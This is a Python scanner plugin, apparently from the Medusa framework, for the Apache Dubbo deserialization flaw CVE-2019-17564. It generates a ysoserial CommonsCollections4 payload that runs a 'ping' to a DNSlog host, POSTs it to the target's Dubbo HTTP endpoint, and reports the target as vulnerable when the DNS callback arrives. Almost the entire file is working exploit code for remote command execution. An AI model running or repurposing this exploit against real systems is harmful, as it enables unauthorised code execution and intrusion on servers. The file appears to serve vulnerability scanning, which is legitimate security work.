#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,UrlProcessing,ErrorLog,WriteFile,ErrorHandling,Proxies,Dnslog,GetToolFilePath,randoms,GetTempFilePath
import urllib3
import requests
import time
import binascii
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2019-17564" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-6-23"  # 插件编辑时间
        self.info['disclosure'] = '2020-2-11'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "DubboDeserializationVulnerability"  # 插件名称
        self.info['name'] ='Dubbo反序列化漏洞' #漏洞名称
        self.info['affects'] = "Dubbo"  # 漏洞组件
        self.info['desc_content'] = "该漏洞的主要原因在于当ApacheDubbo启用HTTP协议之后，ApacheDubbo对消息体处理不当导致不安全反序列化，当项目包中存在可用的gadgets时即可导致远程代码执行."  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['version'] = "2.7.0<=ApacheDubbo<=2.7.4.1\r\n2.6.0<=ApacheDubbo<=2.6.7\r\nApacheDubbo=2.5.x"  # 这边填漏洞影响的版本
        self.info['suggest'] = "升级最新Dubbo版本"  # 修复建议
        self.info['details'] = Medusa  # 结果



def generate_payload(path_ysoserial, jrmp_listener_ip,jrmp_client,TempPath):
    # generates ysoserial payload
    command = 'java -jar {} {} "{}" > {}.out'.format(path_ysoserial, jrmp_client, jrmp_listener_ip,
                                                           TempPath)
    os.system(command)
    bin_file = open('{}.out'.format(TempPath), 'rb').read()
    return bin_file

def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        con=""
        payload = '/org.apache.dubbo.samples.http.api.DemoService'
        payload_url = scheme + "://" + url + ":" + str(port) + payload
        DL=Dnslog()
        JrmpClient = "CommonsCollections4"
        YsoserialPath=GetToolFilePath().Result()+"ysoserial.jar"
        TempPath=GetTempFilePath().Result()+str(int(time.time()))+"_"+randoms().result(10)
        data=generate_payload(YsoserialPath, "ping "+DL.dns_host(), JrmpClient,TempPath)
        headers = {
            'User-Agent': RandomAgent,
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
        }
        try:
            resp = requests.post(payload_url,data=data,headers=headers, proxies=proxies, timeout=6, verify=False)
            con = resp.text
        except:
            pass
        if DL.result():
            Medusa = "{} 存在Dubbo反序列化漏洞(CVE-2019-17564)\r\n验证数据:\r\n返回DNSLOG:{}\r\n使用DNSLOG数据:{}\r\n返回数据包:{}\r\n".format(url,DL.dns_text(),DL.dns_host(),con)
            print(Medusa)
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)  # 调用写入类传入URL和错误插件名



if __name__ == '__main__':
    UrlList=[]
    ThredList=[]
    with open("123.txt", 'r', encoding='UTF-8') as f:
        for i in f:
            print(i)
            medusa(i.strip("\r\n"),"11",proxies="127.0.0.1:8080")